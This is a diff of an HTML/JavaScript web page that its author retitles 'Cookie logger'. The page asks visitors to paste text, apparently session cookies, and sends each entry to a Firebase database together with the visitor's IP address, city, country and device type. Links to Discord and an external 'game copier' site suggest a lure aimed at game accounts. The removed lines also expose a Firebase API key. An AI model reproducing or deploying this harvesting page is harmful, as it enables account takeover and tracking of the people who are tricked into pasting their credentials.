@@ -3,80 +3,145 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>For fans</title>
+<title>Cookie logger</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
 
 <style>
-* {margin:0;padding:0;box-sizing:border-box;font-family:'Orbitron',sans-serif;}
-body {height:100vh;background:black;overflow:hidden;color:white;}
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Orbitron', sans-serif;
+}
 
-#bg {position:fixed;top:0;left:0;z-index:-1;}
+body {
+    height: 100vh;
+    background: black;
+    overflow: hidden;
+    color: white;
+}
+
+#bg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: -1;
+}
 
 .cursor {
-    position:fixed;width:20px;height:20px;background:cyan;
-    border-radius:50%;pointer-events:none;
-    box-shadow:0 0 20px cyan,0 0 40px cyan;
-    transform:translate(-50%,-50%);z-index:9999;
+    position: fixed;
+    width: 20px;
+    height: 20px;
+    background: cyan;
+    border-radius: 50%;
+    pointer-events: none;
+    box-shadow: 0 0 20px cyan, 0 0 40px cyan;
+    transform: translate(-50%, -50%);
+    z-index: 9999;
 }
 
 .sidebar {
-    position:fixed;left:0;top:0;height:100%;width:80px;
-    background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);
-    transition:0.3s;padding-top:20px;
+    position: fixed;
+    left: 0;
+    top: 0;
+    height: 100%;
+    width: 80px;
+    background: rgba(0,0,0,0.6);
+    backdrop-filter: blur(10px);
+    transition: 0.3s;
+    padding-top: 20px;
 }
-.sidebar:hover {width:200px;}
+
+.sidebar:hover {
+    width: 200px;
+}
 
 .sidebar button {
-    width:100%;padding:15px;background:none;border:none;
-    color:cyan;text-align:left;cursor:pointer;
+    width: 100%;
+    padding: 15px;
+    background: none;
+    border: none;
+    color: cyan;
+    text-align: left;
+    cursor: pointer;
 }
-.sidebar button:hover {background:rgba(0,255,255,0.2);}
+
+.sidebar button:hover {
+    background: rgba(0,255,255,0.2);
+}
 
 .page {
-    display:none;position:absolute;top:50%;left:55%;
-    transform:translate(-50%,-50%);text-align:center;
+    display: none;
+    position: absolute;
+    top: 50%;
+    left: 55%;
+    transform: translate(-50%, -50%);
+    text-align: center;
 }
-.page.active {display:block;}
+
+.page.active {
+    display: block;
+}
 
 .glitch {
-    font-size:34px;color:cyan;
-    text-shadow:0 0 10px cyan;
-    animation:glitch 1s infinite;
+    font-size: 34px;
+    color: cyan;
+    text-shadow: 0 0 10px cyan;
+    animation: glitch 1s infinite;
 }
+
 @keyframes glitch {
-    0%{text-shadow:2px 0 red,-2px 0 blue;}
-    50%{text-shadow:-2px 0 red,2px 0 blue;}
-    100%{text-shadow:2px 0 red,-2px 0 blue;}
+    0% { text-shadow: 2px 0 red, -2px 0 blue; }
+    50% { text-shadow: -2px 0 red, 2px 0 blue; }
+    100% { text-shadow: 2px 0 red, -2px 0 blue; }
 }
 
 input {
-    margin-top:20px;padding:15px;width:300px;
-    border-radius:10px;border:none;
-    background:rgba(255,255,255,0.1);
-    color:white;outline:none;
+    margin-top: 20px;
+    padding: 15px;
+    width: 300px;
+    border-radius: 10px;
+    border: none;
+    background: rgba(255,255,255,0.1);
+    color: white;
+    outline: none;
 }
 
 button.send {
-    margin-top:15px;padding:15px 30px;
-    border-radius:10px;border:none;
-    background:cyan;color:black;cursor:pointer;
+    margin-top: 15px;
+    padding: 15px 30px;
+    border-radius: 10px;
+    border: none;
+    background: cyan;
+    color: black;
+    cursor: pointer;
 }
 
 .powered {
-    margin-top:20px;color:cyan;
-    text-shadow:0 0 10px cyan;
+    margin-top: 20px;
+    color: cyan;
+    text-shadow: 0 0 10px cyan;
 }
 
+/* GAME COPIER CARD */
 .tool-card {
-    margin-top:20px;width:250px;padding:15px;
-    border:1px solid cyan;border-radius:15px;
-    cursor:pointer;text-align:center;
-    box-shadow:0 0 15px cyan;
-    margin-left:auto;margin-right:auto;
-    transition:0.3s;
+    margin-top: 20px;
+    width: 250px;
+    padding: 15px;
+    border: 1px solid cyan;
+    border-radius: 15px;
+    cursor: pointer;
+    text-align: center;
+    box-shadow: 0 0 15px cyan;
+    margin-left: auto;
+    margin-right: auto;
+    transition: 0.3s;
 }
-.tool-card:hover {transform:scale(1.05);}
+
+.tool-card:hover {
+    transform: scale(1.05);
+}
 </style>
 </head>
 
@@ -93,7 +158,7 @@ button.send {
 </div>
 
 <div class="page active" id="main">
-    <div class="glitch">fans</div>
+    <div class="glitch">Cookie</div>
 
     <input type="text" id="messageInput" placeholder="Type something...">
     <br>
@@ -118,17 +183,15 @@ button.send {
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js"></script>
 
 <script>
-
-/* FIREBASE CONFIG */
+/* FIREBASE CONFIG (YOUR DB) */
 const firebaseConfig = {
-  apiKey: "AIzaSyB5a-y6d0v-EAy0_Vm3Viy4YHyVC0owasA",
+  apiKey: "YOUR_KEY",
   authDomain: "chat-panel-f23cb.firebaseapp.com",
   databaseURL: "https://chat-panel-f23cb-default-rtdb.europe-west1.firebasedatabase.app",
   projectId: "chat-panel-f23cb",
   storageBucket: "chat-panel-f23cb.firebasestorage.app",
   messagingSenderId: "1063884288659",
-  appId: "1:1063884288659:web:96656490f8e3ddbab9d366",
-  measurementId: "G-QR5JLJX0PN"
+  appId: "1:1063884288659:web:96656490f8e3ddbab9d366"
 };
 
 firebase.initializeApp(firebaseConfig);
@@ -151,9 +214,11 @@ function showPage(id) {
 function openHelp() {
     window.open("https://discord.com/users/1269285660834140215", "_blank");
 }
+
 function openInvite() {
     window.open("https://discord.gg/zEtZCQ95eT", "_blank");
 }
+
 function openGameCopier() {
     window.open("https://speedubx.github.io/AwpTools/", "_blank");
 }
@@ -163,22 +228,14 @@ async function getLocation() {
     try {
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
+
         return `🌍 ${data.city}, ${data.country_name} | ${data.ip}`;
     } catch {
         return "🌍 Unknown";
     }
 }
 
-/* DATA */
-let specialCount = localStorage.getItem("specialCount") ? parseInt(localStorage.getItem("specialCount")) : 0;
-let xp = localStorage.getItem("xp") ? parseInt(localStorage.getItem("xp")) : 0;
-
-function saveData() {
-    localStorage.setItem("specialCount", specialCount);
-    localStorage.setItem("xp", xp);
-}
-
-/* SEND */
+/* SEND MESSAGE (FIXED) */
 async function sendMessage() {
     const msg = document.getElementById("messageInput").value.trim();
     if (!msg) return alert("Please Paste");
@@ -186,31 +243,9 @@ async function sendMessage() {
     const time = new Date().toLocaleString();
     const device = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 PC";
 
-    xp++;
-    if (msg.startsWith("_|")) specialCount++;
-    saveData();
-
     const locationText = await getLocation();
 
-    /* COMMANDS (kept but local now) */
-    if (msg === "/accstatus") {
-        alert(`_| Messages: ${specialCount}`);
-        return;
-    }
-
-    if (msg === "/reset") {
-        specialCount = 0;
-        xp = 0;
-        saveData();
-        return;
-    }
-
-    if (msg === "/level") {
-        alert(`Level: ${Math.floor(xp/5)} | XP: ${xp}`);
-        return;
-    }
-
-    /* SEND TO RECEIVER */
+    /* SEND TO FIREBASE */
     await db.ref("messages").push({
         text: msg,
         time: time,
@@ -229,35 +264,37 @@ canvas.width = innerWidth;
 canvas.height = innerHeight;
 
 let particles = [];
+
 for (let i = 0; i < 200; i++) {
     particles.push({
-        x:(Math.random()-0.5)*canvas.width,
-        y:(Math.random()-0.5)*canvas.height,
-        z:Math.random()*1000
+        x: (Math.random() - 0.5) * canvas.width,
+        y: (Math.random() - 0.5) * canvas.height,
+        z: Math.random() * 1000
     });
 }
 
 function draw() {
-    ctx.fillStyle="black";
-    ctx.fillRect(0,0,canvas.width,canvas.height);
+    ctx.fillStyle = "black";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-    particles.forEach(p=>{
-        p.z-=2;
-        if(p.z<=0)p.z=1000;
+    particles.forEach(p => {
+        p.z -= 2;
+        if (p.z <= 0) p.z = 1000;
 
-        let k=128/p.z;
-        let x=p.x*k+canvas.width/2;
-        let y=p.y*k+canvas.height/2;
-        let size=(1-p.z/1000)*3;
+        let k = 128 / p.z;
 
-        ctx.fillStyle="cyan";
-        ctx.fillRect(x,y,size,size);
+        let x = p.x * k + canvas.width / 2;
+        let y = p.y * k + canvas.height / 2;
+
+        let size = (1 - p.z / 1000) * 3;
+
+        ctx.fillStyle = "cyan";
+        ctx.fillRect(x, y, size, size);
     });
 
     requestAnimationFrame(draw);
 }
 draw();
-
 </script>
 
 </body>
